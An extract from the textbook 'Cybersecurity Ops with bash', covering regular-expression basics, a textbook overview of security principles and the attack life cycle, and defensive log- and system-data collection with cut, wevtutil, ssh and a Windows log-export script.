Paul Troncone & 
 Carl Albing, PhD
Cybersecurity  
Ops with bash
Attack, Defend, and Analyze from  
the Command Line
Paul Troncone and Carl Albing
Cybersecurity Ops with bash
Attack, Defend, and Analyze from the
Command Line
Boston
Farnham
Sebastopol
Tokyo
Beijing
Boston
Farnham
Sebastopol
Tokyo
Beijing
978-1-492-04131-3
[LSI]
Cybersecurity Ops with bash
by Paul Troncone and Carl Albing
Copyright © 2019 Digadel Corp & Carl Albing. All rights reserved.
Printed in the United States of America.
Published by O’Reilly Media, Inc., 1005 Gravenstein Highway North, Sebastopol, CA 95472.
O’Reilly books may be purchased for educational, business, or sales promotional use. Online editions are
also available for most titles (http://oreilly.com). For more information, contact our corporate/institutional
sales department: 800-998-9938 or corporate@oreilly.com.
Acquisitions Editor: Rachel Roumeliotis
Developmental Editors: Virginia Wilson and John
Devins
Production Editor: Nan Barber
Copyeditor: Sharon Wilkey
Proofreader: Christina Edwards
Indexer: Ellen Troutman-Zaig
Interior Designer: David Futato
Cover Designer: Karen Montgomery
Illustrator: Rebecca Demarest
April 2019:
 First Edition
Revision History for the First Edition
2019-04-01: First Release
2020-04-24: Second Release
See http://oreilly.com/catalog/errata.csp?isbn=9781492041313 for release details.
The O’Reilly logo is a registered trademark of O’Reilly Media, Inc. Cybersecurity Ops with bash, the cover
image, and related trade dress are trademarks of O’Reilly Media, Inc.
The views expressed in this work are those of the authors, and do not represent the publisher’s views.
While the publisher and the authors have used good faith efforts to ensure that the information and
instructions contained in this work are accurate, the publisher and the authors disclaim all responsibility
for errors or omissions, including without limitation responsibility for damages resulting from the use of
or reliance on this work. Use of the information and instructions contained in this work is at your own
risk. If any code samples or other technology this work contains or describes is subject to open source
licenses or the intellectual property rights of others, it is your responsibility to ensure that your use
thereof complies with such licenses and/or rights.
To Erin and Kiera. You bring joy to every moment of my life.
—Paul
 
To Cynthia, and our sons Greg, Eric, and Andrew.
—Carl
Table of Contents
Preface. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  xiii
Brackets and Character Classes
In regex, the square brackets, [ ], are used to define character classes and lists of
acceptable characters. Using this construct, you can list exactly which characters are
matched at this position in the pattern. This is particularly useful when trying to per‐
form user-input validation. As shorthand, you can specify ranges with a dash, such as
[a-j]. These ranges are in your locale’s collating sequence and alphabet. For the C
locale, the pattern [a-j] will match one of the letters a through j. Table 3-1 provides a
list of common examples when using character classes and ranges.
Table 3-1. Regex character ranges
Example
Meaning
[abc]
Match only the character a or b or c
[1-5]
Match on digits in the range 1 to 5
[a-zA-Z]
Match any lowercase or uppercase a to z
[0-9 +-*/]
Match on numbers or these four mathematical symbols
[0-9a-fA-F] Match a hexadecimal digit
Be careful when defining a range for digits; the range can at most
go from 0 to 9. For example, the pattern [1-475] does not match
on numbers between 1 and 475; it matches on any one of the digits
(characters) in the range 1–4 or the character 7 or the character 5.
There are also predefined character classes known as shortcuts. These can be used to
indicate common character classes such as numbers or letters. See Table 3-2 for a list
of shortcuts.
Table 3-2. Regex shortcuts
Shortcut
Meaning
\s
Whitespace
\S
Not whitespace
\d
Digit
\D
Not digit
Regular Expression Metacharacters 
| 
31
Shortcut
Meaning
\w
Word
\W
Not word
\x
Hexadecimal number (e.g., 0x5F)
Note that these shortcuts are not supported by egrep. In order to use them, you must
use grep with the -P option. That option enables the Perl regular expression engine to
support the shortcuts. For example, you use the following to find any numbers in
frost.txt:
$ grep -P '\d' frost.txt
1    Two roads diverged in a yellow wood,
2    And sorry I could not travel both
3    And be one traveler, long I stood
4    And looked down one as far as I could
5    To where it bent in the undergrowth;
6
7 Excerpt from The Road Not Taken by Robert Frost
Other character classes (with a more verbose syntax) are valid only within the bracket
syntax, as shown in Table 3-3. They match a single character, so if you need to match
many in a row, use the * or + to get the repetition you need.
Table 3-3. Regex character classes in brackets
Character class Meaning
[:alnum:]
Any alphanumeric character
[:alpha:]
Any alphabetic character
[:cntrl:]
Any control character
[:digit:]
Any digit
[:graph:]
Any graphical character
[:lower:]
Any lowercase character
[:print:]
Any printable character
[:punct:]
Any punctuation
[:space:]
Any whitespace
[:upper:]
Any uppercase character
[:xdigit:]
Any hex digit
To use one of these classes, it has to be inside the brackets, so you end up with two
sets of brackets. For example, grep '[[:cntrl:]]' large.data will look for lines
containing control characters (ASCII 0–25). Here is another example:
grep 'X[[:upper:][:digit:]]' idlist.txt
32 
| 
Chapter 3: Regular Expressions Primer
This will match any line with an X followed by any uppercase letter or digit. It would
match these lines:
User: XTjohnson
an XWing model 7
an X7wing model
Each has an uppercase X followed immediately by either another uppercase letter or
by a digit.
Back References
Regex back references are one of the most powerful and often confusing regex opera‐
tions. Consider the following file, tags.txt:
1    Command
2    <i>line</i>
3    is
4    <div>great</div>
5    <u>!</u>
Suppose you want to write a regular expression that will extract any line that contains
a matching pair of complete HTML tags. The start tag has an HTML tag name; the
ending tag has the same tag name but with a leading slash. <div> and </div> are a
matching pair. You can search for these by writing a lengthy regex that contains all
possible HTML tag values, or you can focus on the format of an HTML tag and use a
regex back reference, as follows:
$ egrep '<([A-Za-z]*)>.*</\1>' tags.txt
2    <i>line</i>
4    <div>great</div>
5    <u>!</u>
In this example, the back reference is the \1 appearing in the latter part of the regular
expression. It is referring back to the expression enclosed in the first set of parenthe‐
ses, [A-Za-z]*, which has two parts. The letter range in brackets denotes a choice of
any letter, uppercase or lowercase. The * that follows it means to repeat that zero or
more times. Therefore, the \1 refers to whatever was matched by that pattern in
parentheses. If [A-Za-z]* matches div, then the \1 also refers to the pattern div.
The overall regular expression, then, can be described as matching a less-than sign (<)
that literal character is the first one in the regex; followed by zero or more letters;
then a greater-than (>) and then zero or more of any character, as . indicates any
character, and * indicates zero or more of the previous item; followed by another <
and a slash (/); and then the sequence matched by the expression within the paren‐
theses; and finally a > character. If this sequence matches any part of a line from our
text file, egrep will print that line.
Regular Expression Metacharacters 
| 
33
You can have more than one back reference in an expression and refer to each with a
\1 or \2 or \3 depending on its order in the regular expression. A \1 refers to the first
set of parentheses, \2 to the second, and so on. Note that the parentheses are meta‐
characters; they have a special meaning. If you just want to match a literal parenthe‐
sis, you need to escape its special meaning by preceding it with a backslash, as in sin\
([0-9.]*\) to match expressions like sin(6.2) or sin(3.14159).
Valid HTML doesn’t have to be all on one line; the end tag can be
several lines away from the start tag. Moreover, some single tags
can indicate both a start and an end, such as <br/> for a break, or
<p/> for an empty paragraph. We would need a more sophisticated
approach to include such things in our search.
Quantifiers
Quantifiers specify the number of times an item must appear in a string. Quantifiers
are defined by curly braces { }. For example, the pattern T{5} means that the letter T
must appear consecutively exactly five times. The pattern T{3,6} means that the let‐
ter T must appear consecutively three to six times. The pattern T{5,} means that the
letter T must appear five or more times.
Anchors and Word Boundaries
You can use anchors to specify that a pattern must exist at the beginning or the end of
a string. The caret (^) character is used to anchor a pattern to the beginning of a
string. For example, ^[1-5] means that a matching string must start with one of the
digits 1 through 5, as the first character on the line. The $ character is used to anchor
a pattern to the end of a string or line. For example, [1-5]$ means that a string must
end with one of the digits 1 through 5.
In addition, you can use \b to identify a word boundary (i.e., a space). The pattern
\b[1-5]\b will match on any of the digits 1 through 5, where the digit appears as its
own word.
Summary
Regular expressions are extremely powerful for describing patterns and can be used
in coordination with other tools to search and process data.
The uses and full syntax of regex far exceed the scope of this book. You can visit the
following resources for additional information and utilities related to regex:
• http://www.rexegg.com/
34 
| 
Chapter 3: Regular Expressions Primer
• https://regex101.com
• https://www.regextester.com/
• http://www.regular-expressions.info/
In the next chapter, we review some of the high-level principles of cybersecurity to
ensure a common understanding of offensive and defensive operations.
Workshop
1. Write a regular expression that matches a floating-point number (a number with
a decimal point) such as 3.14. There can be digits on either side of the decimal
point, but there need not be any on one side or the other. Allow the regex to
match just a decimal point by itself, too.
2. Use a back reference in a regular expression to match a number that appears on
both sides of an equals sign. For example, it should match “314 is = to 314” but
not “6 = 7.”
3. Write a regular expression that looks for a line that begins with a digit and ends
with a digit, with anything occurring in between.
4. Write a regular expression that uses grouping to match on the following two IP
addresses: 10.0.0.25 and 10.0.0.134.
5. Write a regular expression that will match if the hexadecimal string 0x90 occurs
more than three times in a row (i.e., 0x90 0x90 0x90).
Visit the Cybersecurity Ops website for additional resources and the answers to these
questions.
Workshop 
| 
35
CHAPTER 4
Principles of Defense and Offense
In this book, we will be discussing the command line and bash in the context of
cybersecurity. To enable that, we include a brief review of the foundational concepts
of defensive and offensive security operations in order to establish a common under‐
standing and lexicon.
Cybersecurity
Cybersecurity is the practice of protecting information and the systems that store or
process information. It is defined by five principles:
• Confidentiality
• Integrity
• Availability
• Nonrepudiation
• Authentication
Confidentiality
Information has confidentiality if it can be accessed and read only by authorized
users. Authorized users typically include the person generating the information and
the intended recipients of the information. Violating confidentiality is often the goal
of many cyberattacks. To violate confidentiality attackers may intercept the informa‐
tion while in transit (such as over an insecure WiFi connection or the internet), or
they may bypass security controls on a system to steal the information while at rest.
37
Information commonly targeted by attackers includes personal communications (e-
mail, text messages), pictures, trade secrets, payment information (credit/debit card
numbers), personal identifiers (social security numbers), and sensitive government
and military information.
Encryption and access control are typical mechanisms used to protect confidentiality.
Integrity
Information has integrity if it can be modified only by authorized users. Integrity
should be verifiable, meaning it should be easy to determine if information has been
modified by an unauthorized third party.
Integrity can be violated while information is in transit or at rest, and that violation
can be accidental or intentional. Accidental incidents include incorrect data entry,
hardware failure, and effects from solar radiation. Intentional incidents include unau‐
thorized modification of a file, database, or network packet.
Cryptographic hashing is often used to verify integrity of information.
Availability
Information is considered available if it can be accessed when and where it is needed.
Access to information should also be timely and convenient for the user.
Attacks against availability are becoming increasingly popular among nation-states
and hacktivists, as they have an immediate and visible effect. Accidental incidents
include loss of power, hardware failure, or software failure. Intentional acts include
distributed denial-of-service (DDoS) attacks and ransomware attacks.
Redundancy, data and power backups, and failover sites are typically used to main‐
tain high availability rates.
Nonrepudiation
Nonrepudiation links an entity (user, program, etc.) to actions taken by that entity. For
example, a person’s signature on a legal contract can be used to prove that the person
agreed to the terms of the contract. It is difficult for the person who signed the con‐
tract to later deny or repudiate doing so because the evidence of the signature exists.
Common methods to ensure nonrepudiation include user authentication, digital sig‐
natures, and system logging.
Authentication
Authentication deals with positively identifying and verifying the identity of a user.
This is a critical component to ensuring that only authorized users can access or
38 
| 
Chapter 4: Principles of Defense and Offense
modify information. Authentication mechanisms are one of the most targeted aspects
of information systems, as the success of the other four principles is often dependent
upon it.
Common mechanisms used for authentication include usernames and passwords,
electronic key cards, and biometrics.
The Attack Life Cycle
Advanced adversaries such as nation-states, cybercriminals, and elite hackers do not
operate randomly. They follow a common and effective strategy to perform offensive
operations. This strategy was made famous in Mandiant’s “M-Trends 2010: The
Advanced Persistent Threat” and is known as the Attack Life Cycle. The model has
been refined over the years and now is typically described in eight steps:
1. Reconnaissance
2. Initial Exploitation
3. Establish Foothold
4. Escalate Privileges
5. Internal Reconnaissance
6. Lateral Movement
7. Maintain Presence
8. Complete Mission
Throughout this book, we will be developing tools that touch on many phases of this
model.
Reconnaissance
During the Reconnaissance phase, the attacker identifies the address space and layout
of the target network, technologies in use, associated vulnerabilities, and information
about the target organization’s users and hierarchy.
Reconnaissance activities are separated into two categories: passive and active. Passive
reconnaissance does not inject any data into the environment or change the state of
the system, and is generally not detectable by the target. Examples of passive activities
include wired or wireless packet sniffing, internet searches, and Domain Name Sys‐
tem (DNS) queries.
Active reconnaissance does inject data and/or change the state of the system, and as
such is potentially detectable by the target. Examples include port scanning, vulnera‐
bility scanning, and website crawling.
The Attack Life Cycle 
| 
39
At the end of the Reconnaissance phase, the attacker will have a detailed description
of the target network, users of the network, potential vulnerabilities, and in many
cases, valid credentials for the network.
Initial Exploitation
The Initial Exploitation phase begins when an attacker takes her first action to gain
access to a system, typically by exploiting a vulnerability in the system. Techniques
used for initial exploitation include exploiting buffer overflows, Structured Query
Language (SQL) injection, cross-site scripting (XSS), brute-forcing, and phishing.
At the end of the Initial Exploitation phase, the attacker will have gained some level of
access to the system, such as the ability to read or write data, or to execute arbitrary
code.
Establish Foothold
Once an attacker has gained initial access to a system, she needs to ensure that she
can remain on the system for the long term and regain access as needed. In particular,
the attacker does not want to have to re-exploit the system each time she needs
access, as that adds risk to the operation. Techniques used to establish a foothold
include creating new system users; enabling remote-access capabilities such as Secure
Shell (SSH), Telnet, or Remote Desktop Protocol (RDP); and installing malware such
as Remote Access Trojans (RATs).
Successful execution of the Establish Foothold phase yields a permanent way for the
attacker to maintain a presence on the system and regain access as necessary.
A foothold is considered permanent if it is able to survive routine
system maintenance such as reboots and patching.
Escalate Privileges
When an attacker gains initial access to a system, she may have done so only at an
unprivileged level. As an unprivileged user, the attacker may not be able to dump
passwords, install software, view other users’ files, or change desired settings. To
address this, the attacker will attempt to escalate privileges to a root or Administrator
account. Techniques to accomplish this include exploiting buffer-overflow vulnerabil‐
ities on the local system, theft of credentials, and process injection.
At the end of the Escalate Privileges phase, the attacker should have access to a privi‐
leged root or Administrator account on the local system. If the attacker is particularly
40 
| 
Chapter 4: Principles of Defense and Offense
lucky, she also will have gained access to a privileged domain account that is usable
across systems on the network.
Internal Reconnaissance
Now that the attacker has solidified a foothold and privileged access on the system,
she can begin to interrogate the network from her new vantage point. The techniques
used in this phase do not differ considerably from the previous Reconnaissance
phase. The main difference is that the attacker now has a view from inside the target
network and will be able to enumerate significantly more hosts. Additionally, internal
network protocols such as those related to Active Directory will now be visible.
At the end of the Internal Reconnaissance phase, the attacker will have a more detailed
map of the target network, hosts, and users, which will be used to refine her overall
strategy and influence the next phase of the life cycle.
Lateral Movement
Because of the nature of computer networks, it is unlikely that the attacker will have
gained access to the exact system that is needed to execute her mission during the Ini‐
tial Compromise phase. Therefore, she will need to move laterally across the network
in order to gain access to the requisite system.
Techniques used in the Lateral Movement phase include theft of credentials, pass-the-
hash, and direct exploitation of vulnerabilities in remote hosts. At the end of this
phase, the attacker will have gained access to the host or hosts needed to accomplish
the mission, and likely several other hosts in between. Many attackers leave persistent
backdoors on systems as they move laterally across the network so they can regain
access at a later date and make it more difficult to completely remove them from the
network if their activity is discovered.
Maintain Presence
Attackers do not typically maintain a constant network connection to malicious
implants spread throughout a target network, as that increases their likelihood of
detection. As an alternative, attackers have their implants periodically call back to a
command-and-control (C&C) server they operate to receive automated instructions
or interact directly with the attacker. This activity, which occurs during the Maintain
Presence phase, known as beaconing, is part of the overall maintenance an attacker
needs to perform to retain presence on the network.
Complete Mission
The final phase of the Attack Life Cycle, the Complete Mission phase, is for the
attacker to accomplish her mission. This often takes the form of collecting and exfil‐
The Attack Life Cycle 
| 
41
trating information from the target network. To evade detection, attackers try to
mask the exfiltration as normal traffic by using standard ports and protocols such as
HTTP, HTTPS, and DNS.
This phase is also often referred to as the Conclusion phase, since
not all intrusions end with exfiltration of data.
Summary
Computer security is the practice of protecting information and the systems that
store or process information. Information should be readable or be able to be modi‐
fied only by authorized parties, and information should be available when and where
it is needed. Additionally, mechanisms are required to ensure that only authorized
entities can access the system and that their activities are logged when they do so.
Offensive activities tend to follow a set pattern, commonly referred to as the Attack
Life Cycle. The pattern begins with an attacker targeting and performing reconnais‐
sance, and ends with the exfiltration of data, or degradation of the system.
For additional details on attack techniques related to this and simi‐
lar exploitation models, see MITRE’s Adversarial Tactics, Techni‐
ques & Common Knowledge (ATT&CK) framework.
In Part II, we begin to explore how the command line can be used to enable cyberse‐
curity operations through the collection, processing, and analysis of data.
42 
| 
Chapter 4: Principles of Defense and Offense
PART II
Defensive Security Operations
with bash
Prepare for the unknown by studying how others in the past have coped with the
unforeseeable and the unpredictable.
—George S. Patton
 
In Part II, we dive into how to use the command line to collect, process, analyze, and
display data for defensive cybersecurity operations.
CHAPTER 5
Data Collection
Data is the lifeblood of nearly every defensive security operation. Data tells you the
current state of the system, what has happened in the past, and even what might hap‐
pen in the future. Data is needed for forensic investigations, verifying compliance,
and detecting malicious activity. Table 5-1 describes data that is commonly relevant
to defensive operations and where it is typically located.
Table 5-1. Data of interest
Data
Data Description
Data Location
Logfiles
Details on historical system activity and
state. Interesting logfiles include
web and DNS server logs, router, firewall,
and intrusion detection system logs, and
application logs.
In Linux, most logfiles are located in the /var/log directory. In a
Windows system logs are found in the Event Log.
Command
history
List of recently executed commands.
In Linux, the location of the history file can be found by
executing echo $HISTFILE. This file is typically located in
the user’s home directory in .bash_history.
Temporary
files
Various user and system files that were
recently accessed, saved, or processed.
In Windows, temp files can be found in c:\windows\temp and
%USERPROFILE%\AppData\Local\. In Linux, temp files are
typically located in /tmp and /var/tmp. The Linux temporary
directory can also be found by using the command echo 
$TMPDIR.
User data
Documents, pictures, and other user-
created files.
User files are typically located in /home/ in Linux and c:\Users\
in Windows.
Browser
history
Web pages recently accessed by the user.
Varies widely based on operating system and browser.
Windows
Registry
Hierarchical database that stores settings
and other data that is critical to the
operation of Windows and applications.
Windows Registry.
45
Throughout this chapter, we explore various methods to gather data, locally and
remotely, from both Linux and Windows systems.
Commands in Use
We introduce cut, file, head, and for Windows systems reg and wevtutil, to select
and gather data of interest from local and remote systems.
cut
cut is a command used to extract select portions of a file. It reads a supplied input file
line by line and parses the line based on a specified delimiter. If no delimiter is speci‐
fied, cut will use a tab character by default. The delimiter characters divide each line
of a file into fields. You can use either the field number or character position number
to extract parts of the file. Fields and characters start at position 1.
Common command options
-c
Specify the character(s) to extract.
-d
Specify the character used as a field delimiter. By default, the delimiter is the tab
character.
-f
Specify the field(s) to extract.
Command example
The cutfile.txt is used to demonstrate the cut command. The file consists of two lines
each, with three columns of data, as shown in Example 5-1.
Example 5-1. cutfile.txt
12/05/2017 192.168.10.14 test.html
12/30/2017 192.168.10.185 login.html
In cutfile.txt. each field is delimited using a space. To extract the IP address (field
position 2), you can use the following command:
$ cut -d' ' -f2 cutfile.txt
192.168.10.14
192.168.10.185
46 
| 
Chapter 5: Data Collection
The -d' ' option specifies the space as the field delimiter. The -f2 option tells cut to
return the second field, in this case, the IP address.
The cut command considers each delimiter character as separating
a field. It doesn’t collapse whitespace. Consider the following exam‐
ple:
Pat   25
Pete  12
If we use cut on this file, we would define the delimiter to be a
space. In the first record there are three spaces between the name
(Pat) and the number (25). Thus, the number is in field 4. However,
for the next line, the name (Pete) is in field 3, since there are only
two space characters between the name and the number. For a data
file like this, it would be better to separate the name from the num‐
bers with a single tab character and use that as the delimiter for
cut.
file
The file command is used to help identify a given file’s type. This is particularly use‐
ful in Linux, as most files are not required to have an extension that can be used to
identify its type (unlike Windows, which uses extensions such as .exe). The file
command looks deeper than the filename by reading and analyzing the first block of
data, also known as the magic number. Even if you rename a .png image file to end
with .jpg, the file command is smart enough to figure that out and tell you the cor‐
rect file type (in this case, a PNG image file).
Common command options
-f
Read the list of files to analyze from a given file.
-k
Do not stop on the first match; list all matches for the file type.
-z
Look inside compressed files.
Command example
To identify the file type, pass the filename to the file command:
$ file unknownfile
unknownfile: Microsoft Word 2007+
Commands in Use 
| 
47
head
The head command displays the first few lines or bytes of a file. By default, head dis‐
plays the first 10 lines.
Common command options
-n
Specify the number of lines to output. To show 15 lines, you can specify -n 15 or
-15.
-c
Specify the number of bytes to output.
reg
The reg command is used to manipulate the Windows Registry and is available in
Windows XP and later.
Common command parameters
add
Add an entry to the registry
export
Copy the specified registry entries to a file
query
Return a list of subkeys below the specified path
Command example
To list all of the root keys in the HKEY_LOCAL_MACHINE hive:
$ reg query HKEY_LOCAL_MACHINE
HKEY_LOCAL_MACHINE\BCD00000000
HKEY_LOCAL_MACHINE\HARDWARE
HKEY_LOCAL_MACHINE\SAM
HKEY_LOCAL_MACHINE\SECURITY
HKEY_LOCAL_MACHINE\SOFTWARE
HKEY_LOCAL_MACHINE\SYSTEM
wevtutil
Wevtutil is a command-line utility used to view and manage system logs in the Win‐
dows environment. It is available in most modern versions of Windows and is callable
from Git Bash.
48 
| 
Chapter 5: Data Collection
Common command parameters
el
Enumerate available logs
qe
Query a log’s events
Common command options
/c
Specify the maximum number of events to read
/f
Format the output as text or XML
/rd
Read direction—if set to true, it will read the most recent logs first
In the Windows command prompt, only a single / is needed before
command options. In the Git Bash terminal, two // are needed
(e.g., //c) because of the way commands are processed.
Command example
To list all of the available logs:
wevtutil el
To view the most recent event in the System log via Git Bash:
wevtutil qe System //c:1 //rd:true
For additional information about the wevtutil command, see
Microsoft’s documentation.
Gathering System Information
One of the first steps in defending a system is understanding the state of the system
and what it is doing. To accomplish this, you need to gather data, either locally or
remotely, for analysis.
Gathering System Information 
| 
49
Executing a Command Remotely Using SSH
The data you want may not always be available locally. You may need to connect to a
remote system such as a web, File Transfer Protocol (FTP), or SSH server to obtain
the desired data.
Commands can be executed remotely and securely by using SSH if the remote system
is running the SSH service. In its basic form (no options), you can just add ssh and a
hostname in front of any shell command to run that command on the specified host.
For example, ssh myserver who will run the who command on the remote machine
myserver. If you need to specify a different username, ssh username@myserver who
or ssh -l username myserver who both do the same thing. Just replace username
with the username you would like to use to log in. You can redirect the output to a
file on your local system, or to a file on the remote system.
To run a command on a remote system and redirect the output to a file on your local
system:
ssh myserver ps > /tmp/ps.out
To run a command on a remote system and redirect the output to a file on the remote
system:
ssh myserver ps \> /tmp/ps.out
The backslash will escape the special meaning of the redirect (in the current shell)
and simply pass the redirect character as the second word of the three words sent to
myserver. When executed on the remote system, it will be interpreted by that shell
and redirect the output on the remote machine (myserver) and leave it there.
In addition, you can take scripts that reside on your local system and run them on a
remote system using SSH. You’d use this command to run the osdetect.sh script
remotely:
ssh myserver bash < ./osdetect.sh
This runs the bash command on the remote system, but passes into it the lines of the
osdetect.sh script directly from your local system. This avoids the need for a two-step
process of, first, transferring the script to the remote system and, then, running that
copied script. Output from running the script comes back to your local system and
can be captured by redirecting stdout, as we have shown with many other commands.
Gathering Linux Logfiles
Logfiles for a Linux system are normally stored in the /var/log/ directory. To easily
collect the logfiles into a single file, use the tar command:
tar -czf ${HOSTNAME}_logs.tar.gz /var/log/
50 
| 
Chapter 5: Data Collection
The option -c is used to create an archive file, -z to zip the file, and -f to specify a
name for the output file. The HOSTNAME variable is a bash variable that is automatically
set by the shell to the name of the current host. We include it in our filename so the
output file will be given the same name as the system, which will help later with orga‐
nization if logs are collected from multiple systems. Note that you will need to be log‐
ged in as a privileged user or use sudo in order to successfully copy the logfiles.
Table 5-2 lists some important and common Linux logs and their standard locations.
Table 5-2. Linux logfiles
Log location
Description
/var/log/apache2/
Access and error logs for the Apache web server
/var/log/auth.log
Information on user logins, privileged access, and remote authentication
/var/log/kern.log
Kernel logs
/var/log/messages General noncritical system information
/var/log/syslog
General system logs
To find more information on where logfiles are being stored for a given system, refer
to /etc/syslog.conf or /etc/rsyslog.conf on most Linux distributions.
Gathering Windows Logfiles
In the Windows environment, wevtutil can be used to manipulate and gather log‐
files. Luckily, this command is callable from Git Bash. The winlogs.sh script, shown in
Example 5-2, uses the wevtutil el parameter to list all available logs, and then the
epl parameter to export each log to a file.
Example 5-2. winlogs.sh
#!/bin/bash -
#
# Cybersecurity Ops with bash
# winlogs.sh
#
# Description:
# Gather copies of Windows log files
#
# Usage:
# winlogs.sh [-z] [dir]
#   -z   Tar and zip the output
#   dir  Optional scratch directory for holding the log files
TGZ=0
if (( $# > 0 ))  
 
 
 
 
then
Gathering System Information 
| 
51
    if [[ ${1:0:2} == '-z' ]] 
 
 
 
    then
 
TGZ=1 
# tgz flag to tar/zip the log files
 
shift
    fi
fi
SYSNAM=$(hostname)
LOGDIR=${1:-/tmp/${SYSNAM}_logs} 
 
 
mkdir -p $LOGDIR 
 
 
 
 
cd ${LOGDIR} || exit -2
wevtutil el | while read ALOG 
 
 
 
do
    ALOG="${ALOG%$'\r'}" 
 
 
 
    echo "${ALOG}:" 
 
 
 
 
    SAFNAM="${ALOG// /_}" 
 
 
 
    SAFNAM="${SAFNAM//\//-}"
    wevtutil epl "$ALOG" "${SYSNAM}_${SAFNAM}.evtx"
done
if (( TGZ == 1 )) 
 
 
 
 
then
    tar -czvf ${SYSNAM}_logs.tgz *.evtx  
 
fi
The script begins with a simple initialization and then an if statement, one that
checks to see whether any arguments were provided to the script. The $# is a spe‐
cial shell variable whose value is the number of arguments supplied on the com‐
mand line when this script is invoked. This conditional for the if is an arithmetic
expression, because of the double parentheses. Therefore, the comparison can
use the greater-than character (>) and it will do a numerical comparison. If that
symbol is used in an if expression with square brackets rather than double
parentheses, > does a comparison of lexical ordering—alphabetical order. You
would need to use -gt for a numerical comparison inside square brackets.
For this script, the only argument we are supporting is a -z option to indicate
that the logfiles should all be zipped up into a single TAR file when it’s done col‐
lecting logfiles. This also means that we can use a simple type of argument pars‐
ing. We will use a more sophisticated argument parser (getopts) in an upcoming
script.
This check takes a substring of the first argument ($1) starting at the beginning
of the string (an offset of 0 bytes), 2 bytes long. If the argument is, in fact, a -z,
we will set a flag. The script also does a shift to remove that argument. What
was the second argument, if any, is now the first. The third, if any, becomes the
second, and so on.
52 
| 
Chapter 5: Data Collection
If the user wants to specify a location for the logs, it can be specified as an argu‐
ment to the script. The optional -z argument, if supplied, has already been
shift-ed out of the way, so any user-supplied path would now be the first argu‐
ment. If no value was supplied on the command line, the expression inside the
braces will return a default value as indicated to the right of the minus sign. We
use the braces around SYSTEM because the _logs would otherwise be considered
part of the variable name.
The -p option to mkdir will create the directory and any intervening directories.
It will also not give an error message if the directory exists. On the next line, we
invoke cd to make that directory the current directory, where the logfiles will be
saved; if the cd should fail, the program will exit with an error code.
Here we invoke wevtutil el to list all the possible logfiles. The output is piped
into a while loop that will read one line (one log filename) at a time.
Since this is running on a Windows system, each line printed by wevtutil will
end with both a newline (\n) and a return (\r) character. We remove the charac‐
ter from the right side of the string by using the % operator. To specify the (non‐
printing) return character, we use the $'string' construct, which substitutes
certain backslash-escaped characters with nonprinting characters (as defined in
the ANSI C standard). So the two characters of \r are replaced with an ASCII 13
character, the return character.
We echo the filename to provide an indication to the user of progress being made
and which log is currently being fetched.
To create the filename into which we want wevtutil to store its output (the log‐
file), we make two edits to the name. First, since the name of the log as provided
may have blanks, we replace any blank with an underscore character. While not
strictly necessary, the underscore avoids the need for quotes when using the file‐
name. The syntax, in general, is ${VAR/old/new} to retrieve the value of VAR with
a substitution: replacing old with new. Using a double slash, ${VAR//old/new}
replaces all occurrences, not just the first.
A common mistake is to type ${VAR/old/new/}, but the trail‐
ing slash is not part of the syntax and will simply be added to
the resulting string if a substitution is made. For example, if
VAR=embolden 
then 
${VAR/old/new/} 
would 
return
embnew/en.
Gathering System Information 
| 
53
Second, some Windows logfile names have a slash character in them. In bash,
however, the / is the separator between directories when used in a pathname. It
shouldn’t be used in a filename, so we make another substitution using the $
{VAR/old/new} syntax, to replace any / with a - character. Notice, though, that
we have to “escape” the meaning of the / in our substitution so that bash doesn’t
think it’s part of the substitution syntax. We use \/ to indicate that we want a lit‐
eral slash.
This is another arithmetic expression, enclosed in double parentheses. Within
those expressions, bash doesn’t require the $ in front of most variable names. It
would still be needed for positional parameters like $1 to avoid confusion with
the integer 1.
Here we use tar to gather all the .evtx files into one archive. We use the -z
option to compress the data, but we don’t use the -v option so that tar does its
work silently (since our script already echoed the filenames as it extracted them).
The script runs in a subshell, so although we have changed directories inside the
script, once the script exits, we are back in the directory where we started. If we
needed to be back in the original directory inside the script, we could use the cd -
command to return to the previous directory.
Gathering System Information
If you are able to arbitrarily execute commands on a system, you can use standard OS
commands to collect a variety of information about the system. The exact commands
you use will vary based on the operating system you are interfacing with. Table 5-3
shows common commands that can yield a great deal of information from a system. 
Note that the command may be different depending on whether it is run within the
Linux or Windows environment.
Table 5-3. Local data-gathering commands
Linux command
Windows Git Bash equivalent
Purpose
uname -a
uname -a
Operating system version information
cat /proc/cpuinfo
systeminfo
Display system hardware and related info
ifconfig
ipconfig
Network interface information
route
route print
